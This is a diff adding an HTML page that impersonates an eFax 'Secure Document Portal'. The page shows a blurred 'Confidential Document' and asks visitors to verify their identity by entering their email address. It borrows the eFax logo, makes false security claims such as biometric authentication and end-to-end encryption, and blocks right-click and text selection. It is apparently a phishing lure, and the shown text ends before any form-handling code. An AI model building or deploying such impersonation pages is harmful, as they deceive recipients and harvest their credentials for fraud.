@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data:; script-src 'self' 'unsafe-inline' https:; style-src 'self' 'unsafe-inline' https:; font-src 'self' https: data:;">
+
+<title>eFax Secure Document Portal</title><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&amp;family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet">
+<script src="https://cdn.tailwindcss.com/3.4.16"></script>
+<script>
+tailwind.config = {
+theme: {
+extend: {
+colors: {
+primary: {
+DEFAULT: '#2D3250',
+50: '#f8fafc',
+100: '#f1f5f9',
+200: '#e2e8f0',
+300: '#cbd5e1',
+400: '#94a3b8',
+500: '#64748b',
+600: '#475569',
+700: '#334155',
+800: '#1e293b',
+900: '#0f172a'
+},
+secondary: {
+DEFAULT: '#424769',
+50: '#fdf4ff',
+100: '#fae8ff',
+200: '#f5d0fe',
+300: '#f0abfc',
+400: '#e879f9',
+500: '#d946ef',
+600: '#c026d3',
+700: '#a21caf',
+800: '#86198f',
+900: '#701a75'
+},
+accent: {
+DEFAULT: '#7077A1',
+50: '#f5f3ff',
+100: '#ede9fe',
+200: '#ddd6fe',
+300: '#c4b5fd',
+400: '#a78bfa',
+500: '#8b5cf6',
+600: '#7c3aed',
+700: '#6d28d9',
+800: '#5b21b6',
+900: '#4c1d95'
+}
+50: '#eef2ff',
+100: '#e0e7ff',
+200: '#c7d2fe',
+300: '#a5b4fc',
+400: '#818cf8',
+500: '#6366f1',
+600: '#4f46e5',
+700: '#4338ca',
+800: '#3730a3',
+900: '#312e81'
+}
+},
+borderRadius: {
+'none': '0px',
+'sm': '4px',
+DEFAULT: '8px',
+'md': '12px',
+'lg': '16px',
+'xl': '20px',
+'2xl': '24px',
+'3xl': '32px',
+'full': '9999px',
+'button': '8px'
+}
+}
+}
+}
+</script>
+<style>
+:where([class^="ri-"])::before { content: "\f3c2"; }
+@keyframes pulse {
+0%, 100% { opacity: 1; transform: scale(1); }
+50% { opacity: 0.85; transform: scale(0.98); }
+}
+@keyframes shine {
+0% { background-position: -200% center; }
+100% { background-position: 200% center; }
+}
+@keyframes glow {
+0% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.3); }
+50% { box-shadow: 0 0 40px rgba(139, 92, 246, 0.6); }
+100% { box-shadow: 0 0 20px rgba(139, 92, 246, 0.3); }
+}
+.glass-effect {
+background: rgba(17, 24, 39, 0.7);
+backdrop-filter: blur(12px);
+border: 1px solid rgba(139, 92, 246, 0.2);
+box-shadow: 0 8px 32px rgba(139, 92, 246, 0.2);
+}
+.gradient-text {
+background: linear-gradient(-70deg, #8b5cf6, #d946ef, #8b5cf6);
+background-size: 200% auto;
+animation: gradientMove 3s ease-in-out infinite;
+-webkit-background-clip: text;
+color: transparent;
+}
+.security-grid {
+background-image:
+linear-gradient(to right, rgba(139, 92, 246, 0.1) 1px, transparent 1px),
+linear-gradient(to bottom, rgba(139, 92, 246, 0.1) 1px, transparent 1px);
+background-size: 40px 40px;
+}
+@keyframes floatSlow {
+0%, 100% { transform: translateY(0) rotate(0deg); }
+25% { transform: translateY(-8px) rotate(-1deg); }
+75% { transform: translateY(8px) rotate(1deg); }
+}
+.shine-effect {
+background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+background-size: 200% 100%;
+animation: shine 3s infinite linear;
+}
+.float-slow {
+animation: floatSlow 6s ease-in-out infinite;
+}
+@keyframes fadeIn {
+from { opacity: 0; transform: translateY(20px); }
+to { opacity: 1; transform: translateY(0); }
+}
+@keyframes shimmer {
+0% { background-position: -1000px 0; }
+100% { background-position: 1000px 0; }
+}
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+@keyframes float {
+0% { transform: translateY(0) rotate(0deg); }
+50% { transform: translateY(-10px) rotate(1deg); }
+100% { transform: translateY(0) rotate(0deg); }
+}
+@keyframes glow {
+0% { filter: drop-shadow(0 0 8px rgba(99, 102, 241, 0.4)); }
+50% { filter: drop-shadow(0 0 24px rgba(99, 102, 241, 0.7)); }
+100% { filter: drop-shadow(0 0 8px rgba(99, 102, 241, 0.4)); }
+}
+@keyframes borderGlow {
+0% { border-color: rgba(99, 102, 241, 0.4); box-shadow: 0 0 15px rgba(99, 102, 241, 0.2); }
+50% { border-color: rgba(99, 102, 241, 0.8); box-shadow: 0 0 25px rgba(99, 102, 241, 0.4); }
+100% { border-color: rgba(99, 102, 241, 0.4); box-shadow: 0 0 15px rgba(99, 102, 241, 0.2); }
+}
+@keyframes gradientMove {
+0% { background-position: 0% 50%; }
+50% { background-position: 100% 50%; }
+100% { background-position: 0% 50%; }
+}
+.floating {
+animation: float 4s ease-in-out infinite;
+}
+.glowing {
+animation: glow 3s ease-in-out infinite;
+}
+.border-glowing {
+animation: borderGlow 3s ease-in-out infinite;
+}
+.glass-effect {
+background: rgba(255, 255, 255, 0.85);
+backdrop-filter: blur(12px);
+border: 1px solid rgba(255, 255, 255, 0.4);
+box-shadow: 0 8px 32px rgba(99, 102, 241, 0.1);
+}
+.gradient-text {
+background: linear-gradient(-70deg, #4f46e5, #06b6d4, #4f46e5);
+background-size: 200% auto;
+animation: gradientMove 3s ease-in-out infinite;
+-webkit-background-clip: text;
+color: transparent;
+}
+.security-grid {
+background:
+linear-gradient(to right, rgba(99, 102, 241, 0.03) 1px, transparent 1px) 0 0 / 40px 40px,
+linear-gradient(to bottom, rgba(99, 102, 241, 0.03) 1px, transparent 1px) 0 0 / 40px 40px;
+}
+.hover-scale {
+transition: transform 0.3s ease;
+}
+.hover-scale:hover {
+transform: scale(1.02);
+}
+* {
+user-select: none;
+}
+.animate-pulse {
+animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+}
+.animate-fadeIn {
+animation: fadeIn 0.5s ease-in-out;
+}
+.animate-shimmer {
+background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,0.2) 20%, rgba(255,255,255,0) 40%);
+background-size: 1000px 100%;
+animation: shimmer 2s infinite linear;
+}
+.animate-spin {
+animation: spin 1s linear infinite;
+}
+.gradient-bg {
+background: linear-gradient(135deg, var(--tw-color-primary-500, #3b82f6) 0%, var(--tw-color-primary-700, #1d4ed8) 100%);
+}
+input[type="number"]::-webkit-inner-spin-button,
+input[type="number"]::-webkit-outer-spin-button {
+-webkit-appearance: none;
+margin: 0;
+}
+.loading-overlay {
+position: fixed;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+background-color: rgba(0, 0, 0, 0.7);
+display: none;
+justify-content: center;
+align-items: center;
+z-index: 9999;
+}
+.loading-spinner {
+width: 50px;
+height: 50px;
+border: 5px solid rgba(255, 255, 255, 0.3);
+border-radius: 50%;
+border-top-color: #fff;
+}
+</style></head>
+
+<body class="min-h-screen bg-white" oncontextmenu="return false">
+<div class="loading-overlay" id="loadingOverlay">
+<div class="loading-spinner animate-spin"></div>
+</div>
+<main class="py-4">
+<section class="bg-gray-50 py-8">
+</section></main><div class="max-w-6xl mx-auto px-4">
+<div class="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-12 items-center">
+<div>
+<div class="flex items-center space-x-3 mb-8">
+<div class="w-10 h-10 bg-blue-500 rounded flex items-center justify-center">
+<i class="ri-shield-keyhole-line text-white text-xl"></i>
+</div>
+<span class="text-xl font-semibold text-gray-800">SecuredFolder &nbsp; &nbsp; &nbsp;</span><img style="width: 176px; height: 40px;" alt="Encrypted, Secure Online Fax Service - eFax" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAgMAAABiCAMAAAD6MiCzAAAA6lBMVEX///8AAACTlZjrKjGQkpX8/PyysrKlp6meoKPrJy5sbGzrIiq6u72LjZHu7u+7u7vNzc+Ymp3n5+hKSkrCw8T19fXqHiZlZWXT1NXf4OBVVVXq6uv+8/PqFR87Ozuur7EoKCjsNz0PDw/97O3+8PD4vL784OH71tddXV19fX3qEBvyf4P3tbfvWF31nqD60dJ3d3f0k5b5xsjxd3rvY2ftQUcbGxvsMTgsLCzvU1nwbnL2p6rzi47tRUs/Pz/vXmPpAAWkHSKzFh3UJixZEBMTBASUGh8xCApODhFvFBfDIyl8FhpnTk/p1da2ayYNAAAaVElEQVR4nO1dC3fiOJYmYGNcBmIc49gFhCIJpAIkFI8UISSV6pnd2Z3Z3f//d9aSdSVdWX6kp9PppLjndJ+KkWRb99N9S65U/n3qX0wm8/1sttntdrPZcjyZ9P+AUQ/0fujqdr2rTQdB4Di2bTtOMJiOHm5X5ls/14H+LOrf3gUx72uIbCfY3uwPKPg1aPI0VfjPYTAdzQ8q4RegyS7QIiCBQbCevPUDHui16eImBwIxBU+rt37EA70yzQa5EKjVnMH4rZ/xQK9K/SIIxPpgdPXWT3mg16T5tBADNWd3sAk+MjEMkKgADQ5oQTCYvfVjHugVafIziGngPO0eZuubJ5vEidJAGBy0wUemye1yvxBBgMvxcrMNVBQ4D2/4hAf686m/erQdxSy8OwiCX40mO0UhBPu3fqQD/dlk3mLz0NlcvvUjHehVqX+RvrZHTqM90jT5a5AZhX4zJjfsvfWjvEPqX17tl89Po9F2Oxrd3czmqGZgj2LI08wQQTSsZ5P/yq/QjeqdqpFQtdrxu698v49Fk1XsAEwHJGmckBMMBjd7Yfv1H2TDcJBpEAyPcujkVd+hG1qtmPWCWuGr3u9j0Xy9q2kCAc7g7pEr/is5jBw8Zg1Vz8PA59d8iZ5VRQiIqf2a9/tA1F+s4/WvjwjW7KDGU0QzSRsEmaHCt8KA6RoqAozhQReUocv5JsjNFtsBVA8tJEHw18NAU0VAjIHXNj8+BPX3OzX+kwYBSILLnRAWfzUMmD6HABMHxCo8mAOFdDEfTYsQQEDgMMtwKQTGXw0DfgsQ0GmGxAroem698QuaA932i/Tf/HmQYQUo5GxYBwkDy6xR3wQDIUgBY+jxi6b3IUpgzTAs/R6mbw0tv3Tzq5tCLSBAsKBdxuLKYJ417ltgoN0BRVD+/d8HmW2/YTTLvlTbqve67WajXHTsYpnKAzlBMBjoc8XME1yN+E/TRdbIb4ABs87EQOeDGQDdsN4yqqUxYNab7XrT7/r1Mh0WN7IaIPGgn7Wb2S2h2Y0zVT1Flh64uuPXncxY8RtgIPyofoBPQ16lMdDudKOhN3S7JQyhy1kgCQGyeWQ2l3hqLmYj7C6yXPGCY8B++gthwGwwT6D5GqO/JSX+bmkMhM1K1PSssNIslIeLneTo29Pdcpy6x9UjMhftLRX9qy1cdNaZe01yMfAqseIQfIIPFxF6KQbqZtQg3lAhBvYjIQSc6d1cv6L3yCwI6KYCYRNmpwtUDHxryHRc7mVeRsNEDLQ+miZ4MQa8WBc0zWFoNrzcdhdrsZPMqT3wDSNm/yImaXXPZWUwoO32ID/sUfZGEwUDr8J1RFHiFBjWhxMDL8WAOfR7biV03WFuh8Uz1/SxFhgznl+N94/rm5ub5/VyzpPCa9kmILrAfIQrzi67fOBPxwCLEBruq9/pT6cXYiAWBL5X6fmdXDGwEnog2N4mCJgsb+5qAdln7sTuoX33yIAxEVUjiT1weQOdSZTQNM3I9z1Tfb7SGDA5lXxDPXWtBAMlneJyN8to9UcFH9KvrB8ZMJA3FPqr22xYjWauV3Bb44a980AX/MV4M8URAXtwxwT9E79s010lEy4YpqvQ+syY/P20Hsn3KIOBXui3vn5hLc7Pvh2Hkhx3fUzspza+zq0ej4mBYd6L09nqhU2r0bCa6QKjnkeol8xnO6w3GnTaTXrZ67JnrlsNq+5mQq0b+cPY5Km7nqqUuvI4scqOnwKamL3IjceNu/lhW+3SS+IextDz5BF4E78Zd2y6EcJBgUa85ca+U6ObyM398yAdLAzukpoBkStO4gNjEAz23z6dy3w+u5YevxgDx63P3xV/4fupMOi+Kb8xGe9njOsyDBSZwr1mgxYXxf9r+MpKaVY7MVn0qttoxU3q5J9eg1ymmSfTp73j/zr6ZWa6lsFaVIcR/s2r8nEq3pC0aDE8xHBLSp7ifi15AUcd2oVRJyGUAwuHVfY+1bpyv2zqzyD0Yye7xczVnaMNFw+SsOAtdyGTOCEUEv39P45U+lLntynAgGeo/Gf0GZRYW/nhW3K5gS6ecrgzVdDKx7/pdqTcsppRpCaF0YmXuGklHKFywKN9SOSpZ4neRkcz5Z4lVS8Yigb3qPNKi5pYkQN9WtOt4qIXo8NtmqiqoZYwebp1dL+SLlF/za36gKr8xTorZWTfUZOAuwE1h2QH+kxl/Os/dSxswX3yMVDVA4ASvMgnfPk8eekTdFFgjs1DI/fleTSZTxsCQWJWxqZUdyiHmzy6EOMJbjfk7pqcdKTUr2Anpdti4/DcFsUAj2tI/WAOtBgQZq+MyaRfGVPlkkPAmdKikP0os3TEHtGQEHcDbBoZZlnDf2ghcHQETMjHwGd9Z0rfWVtF6h9RCWmiS2dcKyfzWxAjNDUFJjIfOQagHcJAEyIQAgSK0Ik66viG7J6ZgIEIpDvFgNeppshgMiYfA2AHCzFSqApjmnCf0KGHSEwecvLG9pZahc+gKOjWMlZT+lsmC9nSzMdAbhTxKJmA9ld8tUouWuhShw8YljEHoMDE6DQaMG9GpP7e6fGVmWCg3aD/thKTgynu5BKW9QwCRrXRADQYQlJxDHQ5zxJdMKTqPH6muBd0Y6H+CGqj4c6EQBcABIyOxV+nVZgi6PPTRZwRMQUWT3n1Y0wOcFUwJZBY0EDx37IZ+MMrgQEvFwNfk/WF+X10Sq5hXIh1CCZhnlkErkPV9XpeCBMoiesESK2IL6+Eg12KgWqnQZnTdH2LS28EOTBJmqHXi5ppjAEGOBSNxHohxkFs1vfiXi6/daIN2m5M7FFjEDJiJhNERJpRtx2B9sqPC8UPwU8XCW5I9mcshYtJzjgm5B7eUZyAG+A8Ea+Aaoa//1cOB69LYKD9IxcEyeLpYbPxLJ5N8z59J0psynPDImx+mS3XhlkTFlay/o0641DVsnwJA8lv7XiOu5yLsr4HGCaGILH0EqbwJmYi9K0OW9SWlfiGvVa9B5zrNtPQZMxW9VwbiT4wYar5zoEwBwcPMTvN5U8RLg7uNrPH28f1k5xJfCa9uGtINxfSiJH937kcpEq6wC8wckf4mki069QYx7Izei69LpuBvGypiyDARanBnXSwzpJ2wtOSMABsAI0u7VxINIbEqZS3aopx4rtKVUEycE1Ie0gvp48TJg1V46AgmvgopMAFgYBAwGA3ZxvNJ49CEgxuyQUIEdk0MEwQYedoAkIGGUjBQMs/5kQW13H+EMm8RfhibBB05L+vxduymTOsbAywhSKtpqilMEm20F0xOMeAtKZBDlu8FUCMPwFjuWhiInmS9Zxe2rrVYoBZqkJesNfp5FkEtzzEuyHcfOBhguBpLCWJeCS4NiBX9/DnlIiBK2oNYDHwY1g/RRc+k8dSMHAu6OiezFgSHvx+dvLt+vrky5FCiZQ3sXt40u7KF84l2QKLIGcnQZQOIABw4G+BAWRbCgyI4KAJggCGgyeQXHQ2XAt6CQzkam0IeosrWgwkKJS3UCWea55ZPIcAMc309Nc82rddorH5XjIaEbqAehF7WyG9iGL4DXGGxm5Q5OaczEOO5f+FzEds3N1f13swywoKvrP3xFd70ZkMCemhQRDnVE9BwFW6xJwJbksr/gAQYAD1VSU9LN9uqh+HBceApH40xEZuiSs6DECsQu7IzJnMkRccAvQ8sSV3+LZKWSjsHrBrxA3gQcIpaZZUj/wTL076esjhJwurAAOxrkc2/LECAvaiOI7gh/JfsonRK8ZAsnDR1kNADlzrtYBHWJ5aaRVd6XUwWnxFplR4OIJfExjI9WBBRYln0GEgStuJvWT0TiWDJmDsJTn/JYQFnDuiFy5Xs0e2jWgO9kDwGF+44O0eYsVg0kH+jvjCXhDpdxLBLcJAqCwFxUhks4Tdw0/yXc7kGSnGgKfRlixsyFdOGzCg5J8tVdVLfUEfNzQ9WYFjh0k7k8uT3IA2ixlJS0SHAYY5GZbM4skKl/d5FUBAdguNebBwE7t/l8u7aRBMqUq43ABWthPiTAbwFwkV0MMH7H8gvrDn6srX7tvFGFDJRemno6Fm2KMvsqMgr7gSGHB1BoOP+QgYUM0qCzeT+1ZZrY6pi094jOkM0BwD+SUO5TCQjIUEFpM7rQzv8BYgMCUbg3hhMI0UTTZ0sTs3NBLMTUCye2QFCmQgumHH8AfcATHr5RgIjzEGQM9hq1BSGPfoTYsxUNfZVWyhQs0BwwAS6IS0Xhcs8uQ5Il31AtiJjOdcF+SXeJXDQCsb0npNs/gJUmBNBDyEhhwSBBqztLFDYgYTqDALNqQhFI86TyYREQmQEFd4mAblcqLSGDC9sHGqaQPj9rIGkY2hMhjA7MDTDXEVwICafgOTHw3eQwaGqxMV4Hgw5nEMZD0jGjgfA4lq07oK+uzhZAcC/okI+AcQ8MQ0uILKkeCWnFQNDWkV+VpuCLLkX4gVfMmgIG69JAa6x9cZAUPAQFctIwDCAq8QA20slmF0Nt3sKsNA6sgKLX6gb3KVsUnx+ZpIAaUCBmnq9rzILYOBUMduNxsDogCQRvy5x0+4LvR/7DFe8PQQ9QL4sTN0V+EkiSfYv+lZgTDQKYcB48d5VhsuX471TT7hVyzEAKx4hb3YkgMMqLJai4EK8vxA1eAm2N4ADGSUOpkeKUDiScR8DPi6Rwqzx+eHD9NdwosRF/cV4iDAb4+r5QCFBsZgDAQkX3jBZIn9P5hXcOrPGbpaAgNtK7sFrxiJV4Y+zazYPYCBTIubBXfVfALwkZWPKUEdID0GZCuBB2qVuyYDMsvNVOIFMpk9v9pC1Qf5GGCFEEZLJkgbpYfvb+XgEI8D2rVY3F+Js+aCKc8hDsjWEe5NUsNReAj/1PIEUwkMRHklBCxJmLBJ9/MnhdfAg8xYMVhwCgZwcA8woAoTPQbqkviHQLTC3hA5pDkYaDfTpQe5GBiqzaWOGgyAJkgOkeCHy9EU0FqXOw5I2SD/iAUyBmpKhKg0Bu5/nHEiAb5hRilZGgMV3c9qCgpS6UUYUKuO2ezWsRz4HRhg91ealMVAmELAH4sBvjMsWFekFBB1BS9HmgoSZxNLgQtebEK3l68cHiv639+FAeW9c/WAgoHr9K9fUyKfzUknq9wXMKB0xKbc78cA00UqBnrlMNDkMWqjVYUS0lwMmFYOBlK1VOaGMxPFiOk2sXEtRfZ0RsoEHrgZSZKHV0Iv/F++DM/CAF64+WVECgbC9K/fKipBMUCW6/0KGGgWY6BdCgO8GqHV8COv5w3VEGAaA7yESEPpzXbCIKTG/ZZnA8iPt6l6YqdGE8ai5IxGjHmguTZp/wEY8NO2/vkXfE3CgJse/ywVCmPzmHkS4dvIgVIYcGFJswwaRKHLYGDop6mpTo7JQwO0KEiUENBDZJaqORDsiM0gKQJiHfafuUUxV9M4vwcD3TO1/Wnj2MWBAgkDJ2rrIyVQTAjqCbOqq98GA14JDLBMjyhVfwkGSh22sUfunsndgOTzE1gO2MGAZIakz9oFTwQCM64/YuD0/n0MqDVEX+nGGcxqgQGlkCShE9Ug8DLCvEAZfgGe3X/fJlR4UsYmBOuOP1kZDFRegAER+CMpIGnHMJUKlauaLSGgNqM1pPOaKCQmEHjgBYX0ELKswJ1M6TihhAEPp4nv2dRmYUB/v1SSnJlVKf4BN/QY0McHXoSBerFvmBcfYIkGiZulMKC/n5bGnJ30TDFeH2KzHcO3Px12KvF0tKSV5P0l33Y4eCbFJjNuUFAhUQoDfh4GsE9wDi+fgYEopTgonalvCnU9GUkziBEpP2OuvAwDchbB1PMEZxG0GEgHmf9oDOx48JcwWBwkZI+SveXmajPabrejm8dVn95hccNLiwNqC4iS0k0CmxbixY8TDZGtH5kYMDGI+ILOwEDW2dfq20M9bsYmE32sGLii5AvKYUAbK8Zd9bFi+dEhuCU9VykMlN+OzvOF9ois4bEwAQf89Ij+ZMLPGrhY/hSb0h+RIgh27HY4bpe5pzwTA3hhiw2DegxkFqF/Ut6ehWVTVh+jLuY2jK7NG5bDAM434ewQnwRd3hBhABLFUr9SGNCWQ2hJLOIZ6S92j9acJ03zW/GNY3t6S6UA9yOe4Ph6XOP3NevWmRgIkRNo8Ot6DKgbzjh9V8whfjZhhpmULvmspLIIBRjAi66H8ANSX1eEBjfVYYCZA3L9l1kiPqBkInJowmU//TAt+vRAMMPHSZkXt9L2Y2dEooMXXJUE4nuWuLRHTd5wysYAui6qZ/UYkMXAPULPNb4f7CXMWhp5NSTAuRdhAEefgZfI5uxaCJY6DLAcsIV6lcAA7K/ML0epSLWBya6x/kZ2BYObMT9Jpn81nznSzsMBXfWyjyh9rwQbaScZT1ESA4KTeNjTdOMv12iT0ZGyBPjphHpUaos8QIKzPwswoKsl47re0Nzcw4aoDgOaUtR2GQwwG7jQKOS5vppNeYoxUHPs59lyPp/vl+vNnbzLzJ7SL9uv+J4joQgIKYm8E9UnTp40EwM47HcGEHK1cUI5V3AWYlFh4PvyCnD99nMIIKBTPhTrOh8D+FMYILHBptXxhAWuwETRYcBNYwDy4PkYYMnj/L32JMTLzxuhB4goGCA7zJJjafEpNM6IpBLMPT+4jDmFQKn9op/9yGt32z0vClsnsE+spBw4+p4coRIqoacEA+E9uoQ9intF6LtQFaxfG5ofoRwMEk0FGEBGoYdLkHiJqdTEVApLsjGAukUpkaIzOGHLTIEymIjDI54JBsyZLlOskD3Y0IOnHh0BAXz6WFc5HCKm8x+fv33+kTDsvmDfcaRkjb+3hv5xVd1plGAAbS0z1A1qSkywWwXSmoXN9GwDauDvIgzIfSFBAXzx0jxhZioPWWjtASae0iOnMYB0Ed9Vo3tXQWMFA5V54Rft7SCgx5TxApIYEzP1LNKCvYLJs2diQBNs/p7OIVEMdBEyQuUACpA4nIClehDAwpE0tiq/i3SBvI8cTkOEC5pKIsbMDgyX4xfII1dTN4M9TZpC8qJwsVj2yYFionggi5zajDTs7/lp5rat+WpVfqgwkZjZccK8c2gEf0lLDLZK6vgSRejz7dfVlpt2DkD5i3MjXHXbSSEGRDQPvBDBAVflCZNLQoPoMADKX0DHTwMOhAV6X1BG+acQCvXPTpMQ1YN6BEyfV+QlJ/zUqppd051Gm1nwTSmRa9kYCAtKiCjRkyxQfOhzelA1OOGBHIg5LbZ2d0MPMQmmGyZRmFpFGBB94XABSTxDFAouwU4z4cLrMABbzXkQm59TI2EA9sDhs2+gZKKBfRH86PJ3h8bJHbPPHbGD2hNFgDm/E4fRbfWH0ebWgJzqmsjxxLQ9kaYvrioGiOKLFLNBXQL8OybkPJi6G0VR6A47MOmg1hOmR2zTphRmKcaAMWybpgkHReCwIxMrjOldqPoUhqQ2XwDIZCAIdXXFFbidFUmHeYL9Y1SbPXKNPJhrKUaSJPgdZtpPbvQgsAfbWXJs+dWDOMg42GR9xjSvFiw5QCwHA+17fUeF5UpigUyJutvgk/pcflWQQYtuyVmBrFwQUnRGoxmGcKibXHVSjIF40GF9aKR1g9Qs5kkY+nA2kcQTLQa6fN03w8gdkidAGxcoccy1Go0GL1II+UO1GnXfbw7JkYpKNZ3M5IBx82L9U/0yBUkabm+vKEjMpRAC9s9Z5hetzTwQ0BZ5dUR6o/IMWYYNxYE4oe+m3PZejQeZ/KNWMhhAPIsvXvEy7pZsVxdgoAGHyPAFiOfb4wdRGfCdVcQSff0At2QN9lSdZkfFQCRAKPWXPuJWFUdXYRsR6fpnuLp4uHPgU7bkZOLa0/OShYAu91sBkCRcnEnH2YuZPkV+PaHGJPjWRiGgT11capJYGaoySO+z1pXoAq/kSYPFh/ytgpyRcrRd6pDK1Nl0+BxLPQbUMxMNt5fCADpUT+pf/DFH5AUEwri7mj8+7EYj8kHrzeN+DPL+cr6Tw8XPV5VcijT1vglR8Zd/HpGfSgfGE4+y0vcedhjZelU8g/t0HXGv3lJnRsh7ZdJaCAKFGOjKZ1TqzilVQGDgDwhk1BN2UZ14q8nUA2rWltWR9IOrORERvdIz/gbJWHqay4tJTBcXl+J1b+XPXDqDx8Kv2puh1ke8v6YPUXAmVRuXIZwfm2rVGG7wnU24uuNEEyIxI6slBHZVOtCPPHNViHKjqnwtrt1KCnMzc8c9/jFto6X1yTzxte14HOXQIbOhr/s1h1In16yYHdoMvVpbGljeUNceKq+KvQRxwChT78vMD89cXj0MpFOr7eAp83tlmI6vT0/uqXy+/3J2cvpNYNQ//SRTest9uwpHlt+fMsMJ9cD9IbdkfkWXP6WrzOnY/tBqJAc8N4ZNzGnfasSKt2V0LF8NInSHdUKpw4Kk+gGXnCMZdx5mhWaieoNsGouHr6syymzS8TVdo2GD7i1oJKih7YbKubPhMHmjhuWiH9o+f1VrmIqLjKc1RMHDuKIhc3GLv3XsBMssf0BDXuiSw8ZCNyr35QDpxu4xmRO/VHHsS6ntRYS8nsrQStcLCb3gy5dyDUk7KuqctIhe9nHVHu2TO4NmO3mjVPgLftB92nSi7iJyaps9kgWmeTme7Uby581eIAR+GdLXkr0LSueIbGcw3T3OV4vF4mqx2j8+j34qn66oDe72mSrjV6V3jAGxexwJg2AwrW2322A6SH3LNMbIrMAd+BXpPWNA7BpUybZ12aOg9vwCQ+DXoXeNAb69sAw5g3X2p+p+aXrXGKjMS37WPtYC05vVwRDQ0/vGgLRxLBcBwd364Axk0jvHQGWc/a0aoQSelgdLMIfeOwYqVxvNd+skCRA4z6vCuPCvTe8eA7E+2NTUfDGzAQbObj0/WAFF9AEwULlcrbdTmi9OeE83Gg+mtc1ydfAFS9BHwEClYvYXj893oxHFwHY0enqe7Sf9gwQoRx8DAwldTFaEFpPM+qAD6egjYeBAv48OGDjQAQMHstDnRQ/0K1LTovQqtS6vS/8PwBk/Zkylp7kAAAAASUVORK5CYII=">
+</div>
+<h2 class="text-2xl md:text-3xl font-bold text-gray-900 mb-4 md:mb-6">eFax Secure Document Access</h2>
+<p class="text-lg md:text-xl text-gray-600 mb-6 md:mb-8">To access your Fax document, please verify your identity using your email address.</p>
+<form id="downloadForm" class="space-y-6">
+<div>
+<label for="email" class="block text-sm font-medium text-gray-700 mb-2">Email Address</label>
+<div class="relative">
+<div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+<i class="ri-mail-line text-gray-400"></i>
+</div>
+<input id="email" name="email" class="w-full pl-12 pr-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-gray-900" placeholder="Enter your email address" required="" type="email">
+</div>
+</div>
+<button type="submit" id="downloadButton" disabled="disabled" class="w-full bg-blue-500 text-white px-6 py-3 rounded-lg hover:bg-blue-600 transition-colors flex items-center justify-center space-x-2 disabled:opacity-50 disabled:cursor-not-allowed !rounded-button">
+<i class="ri-lock-line"></i>
+<span>Access Document</span>
+</button>
+</form>
+</div>
+<div class="bg-white p-8 rounded-2xl shadow-xl">
+<div class="flex items-center space-x-4 mb-6">
+<div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center">
+<i class="ri-file-text-line text-blue-500 text-2xl"></i>
+</div>
+<div>
+<h3 class="font-semibold text-gray-900">Confidential Document</h3>
+<p class="text-sm text-gray-500">PDF • 24.4 MB</p>
+</div>
+</div>
+<div class="bg-blue-50 rounded-lg p-6 mb-6 relative overflow-hidden h-[300px]">
+<div class="absolute inset-0">
+<img src="https://na4.documents.adobe.com/document/ci/CBSCTBABDUAAABACAABAA1xKjdc_WrwTI6HKvwpXt5phczXNZZK-1sKODTiT5h-u5-WXdFQqmzKnbIMsX1K7u-KMyuNh1csUMaNRQ-8TnNmJPtaCgljc89lj7wmUHN3M*/small.png" class="w-full h-full object-cover filter blur-sm" alt="Blurred document">
+</div>
+<div class="absolute inset-0 bg-gradient-to-b from-blue-100/50 to-blue-200/50 mix-blend-overlay"></div>
+</div>
+<div class="flex items-center justify-between text-sm text-gray-500">
+<div class="flex items-center space-x-2">
+<i class="ri-shield-check-line"></i>
+<span>End-to-end encrypted</span>
+</div>
+<div class="flex items-center space-x-2">
+<i class="ri-time-line"></i>
+<span>Expires in 7 Days</span>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<section class="py-6 md:py-8 bg-white">
+</section><div class="grid grid-cols-1 md:grid-cols-3 gap-6 md:gap-8">
+<div class="p-8 bg-gray-50 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
+<div class="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center mb-6">
+<i class="ri-shield-check-line text-blue-500 text-2xl"></i>
+</div>
+<h3 class="text-xl font-semibold text-gray-900 mb-3">End-to-End Encryption</h3>
+<p class="text-gray-600">Your documents are encrypted from the moment they're uploaded until they reach the recipient.</p>
+</div>
+<div class="p-8 bg-gray-50 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
+<div class="w-12 h-12 bg-green-100 rounded-lg flex items-center justify-center mb-6">
+<i class="ri-fingerprint-line text-green-500 text-2xl"></i>
+</div>
+<h3 class="text-xl font-semibold text-gray-900 mb-3">Biometric Authentication</h3>
+<p class="text-gray-600">Multi-factor authentication including fingerprint and face recognition for maximum security.</p>
+</div>
+<div class="p-8 bg-gray-50 rounded-2xl shadow-lg hover:shadow-xl transition-shadow">
+<div class="w-12 h-12 bg-purple-100 rounded-lg flex items-center justify-center mb-6">
+<i class="ri-history-line text-purple-500 text-2xl"></i>
+</div>
+<h3 class="text-xl font-semibold text-gray-900 mb-3">Audit Trail</h3>
+<p class="text-gray-600">Complete visibility into who accessed your documents and when they were viewed.</p>
+</div>
+</div>
+
+
+
+<footer class="bg-gray-900 text-white py-10">
+</footer><div class="max-w-6xl mx-auto px-4">
+<div class="grid grid-cols-2 md:grid-cols-4 gap-8 mb-12">
+<div>
+<div class="flex items-center space-x-2 mb-6">
+<div class="w-8 h-8 bg-blue-500 rounded flex items-center justify-center">
+<i class="ri-shield-keyhole-line text-white text-lg"></i>
